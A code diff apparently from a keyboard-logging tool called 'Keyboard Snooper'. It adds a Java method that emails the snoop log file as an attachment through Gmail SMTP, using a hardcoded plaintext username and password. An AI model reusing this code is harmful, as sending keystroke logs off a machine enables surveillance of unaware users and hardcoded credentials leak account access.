@@ -9,9 +9,17 @@ import javax.swing.*;
 import java.net.*;
 import java.awt.*;
 
+import java.util.regex.*;
+import javax.mail.*;
+import javax.activation.*;
+import javax.mail.internet.*;
+
 import com.google.gson.Gson;
 
 public class Util {
+	
+	public static final Pattern VALID_EMAIL_ADDRESS_REGEX = 
+		Pattern.compile("^[A-Z0-9._%+-]+@[A-Z0-9.-]+\\.[A-Z]{2,6}$", Pattern.CASE_INSENSITIVE);
 	
 	//create a file in the disk
 	public static File createFile(String filename) {
@@ -194,5 +202,70 @@ public class Util {
 		} catch (Exception ex) {
 			Util.notif(Snooper.TITLE, "Error opening current log...");
 		}
+	}
+	
+	public static boolean isEmailValid(String string) {
+		Matcher matcher = VALID_EMAIL_ADDRESS_REGEX.matcher(string);
+		return matcher.find();
+	}
+	
+	public static void sendEmail(String to, String subjectText, String messageText, SLogFile sLogFile) {
+		String from = "keyboardsnooper@gmail.com";
+		String username = "keyboardsnooper";
+		String password = "keyboardsnooperpassword";
+		
+		Properties props = System.getProperties();
+		props.put("mail.smtp.auth", "true");
+		props.put("mail.smtp.host", "smtp.gmail.com");
+		props.put("mail.smtp.port", "587");
+		props.put("mail.smtp.starttls.enable", "true");
+		props.put("mail.smtp.ssl.trust", "smtp.gmail.com");
+		props.put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory");
+		
+		Session session = Session.getInstance(props,
+			new javax.mail.Authenticator() {
+				protected javax.mail.PasswordAuthentication getPasswordAuthentication() {
+					return new javax.mail.PasswordAuthentication(username,password);
+				}
+		});
+		
+		try {
+			Message message = new MimeMessage(session);
+			message.setFrom(new InternetAddress(from));
+			message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(to));
+			
+			//set subject and message
+			message.setSubject(subjectText);
+			BodyPart messageBodyPart = new MimeBodyPart();
+			messageBodyPart.setText(messageText);
+			Multipart multipart = new MimeMultipart();
+			multipart.addBodyPart(messageBodyPart);
+			
+			//attach file
+			messageBodyPart = new MimeBodyPart();
+			String filename = sLogFile.getFilepath();
+			DataSource source = new FileDataSource(filename);
+			messageBodyPart.setDataHandler(new DataHandler(source));
+			messageBodyPart.setFileName(sLogFile.getFilename());
+			multipart.addBodyPart(messageBodyPart);
+			
+			message.setContent(multipart);
+			
+			//send the complete message
+			Transport.send(message);
+			
+			Util.notif(Snooper.TITLE, "Sent message successfully...");
+		} catch (Exception e) {
+			Util.notif(Snooper.TITLE, "Problem sending message...");
+		}
+	}
+	
+	public static void sendEmailSnoopLog(String to, SLogFile sLogFile) {
+		sendEmail(
+			to,
+			"Keyboard Snooper (SnoopLog by " + Snooper.getInstance().getPref().getNickname() + "): " + sLogFile.getDate(),
+			"Support me on patreon: https://patreon.com/doppelgunner \nor through paypal: https://www.paypal.me/doppelgunner",
+			sLogFile
+		);
 	}
 }
